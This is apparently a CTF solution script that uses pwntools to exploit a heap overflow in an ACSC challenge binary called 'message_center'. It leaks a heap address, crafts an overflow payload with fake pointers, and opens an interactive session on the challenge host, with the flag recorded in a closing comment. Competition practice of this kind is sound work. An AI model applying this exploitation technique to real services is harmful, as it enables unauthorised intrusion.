# https://pastebin.com/Lh3VAkyy by parrot
# heap overflow on calling genmsglist from delmsg because genmsglist will be called when the offset of file is 0 instead of 8, so unread size_t will be considered part of msgs

#!/usr/bin/env python3
from pwn import *

def login(p,u,pw):
    p.recvuntil(b"choice:")
    p.sendline(b"1")
    p.recvuntil(b":")
    p.sendline(u)
    p.recvuntil(b":")
    p.sendline(pw)

def sendmsg(p,to,s,msglen,msg):
    p.recvuntil(b"choice:")
    p.sendline(b"5")
    p.recvuntil(b":")
    p.sendline(to)
    p.recvuntil(b":")
    p.send(s)
    p.recvuntil(b":")
    p.sendline(str(msglen).encode())
    p.recvuntil(b":")
    p.send(msg)

def readmsg(p):
    p.recvuntil(b":")
    p.sendline(b"4")

def refreshUnread(p):
    p.recvuntil(b":")
    p.sendline(b"2")

def delmsg(p,idx):
    p.recvuntil(b"choice:")
    p.sendline(b"4")
    p.recvuntil(b":")
    p.sendline(str(idx).encode())

def clearMsgs(p):
    p.recvuntil(b":")
    p.sendline(b"5")

def displayMsg(p,idx):
    p.recvuntil(b"choice:")
    p.sendline(b"3")
    p.recvuntil(b":")
    p.sendline(str(idx).encode())

def changepw(p,pw):
    p.recvuntil(b":")
    p.sendline(b"3")
    p.recvuntil(b":")
    p.sendline(b"p@ssw0rd")
    p.recvuntil(b":")
    p.sendline(pw)

def userInfo(p):
    p.recvuntil(b":")
    p.sendline(b"2")


for i in range(10):
    # s = process("./message_center",env={"REMOTE_HOST":"/"})
    # r = process("./message_center",env={"REMOTE_HOST":"/"})
    s = remote("message-center.chal.acsc.asia",4869)
    r = remote("message-center.chal.acsc.asia",4869)

    login(s,b"admin",b"!toor!1234");
    login(r,b"ddaa",b"p@ssw0rd");

    changepw(r,b"A"*0x10)
    userInfo(r)
    r.recvuntil(b"A"*0x10)
    heapbase = int.from_bytes(r.recvn(6),byteorder="little") - 0x1530
    print(hex(heapbase))
    readmsg(r)
    clearMsgs(r)
    sendmsg(s,b"ddaa",b"A",10,b"A")
    sendmsg(s,b"ddaa",b"A",0x200,b"\x01"*0x109+p64(0xdeedbeefdeedbeef)+b"\xff"*0x18+p64(0xbaadf00dbaadf00d)*16+p64(heapbase+0x480)+b"\x00")
    sendmsg(s,b"ddaa",b"A",0x40,b"LOL")

    refreshUnread(r)
    delmsg(r,0)
    displayMsg(r,1)
    # print(r.recvuntil(b"choice").decode())
    r.interactive()
    # print(r.recvuntil(b"choice").decode())
    r.close()
    s.close()

    # Message: ACSC{ls33k_ls33k_th3_fl4g}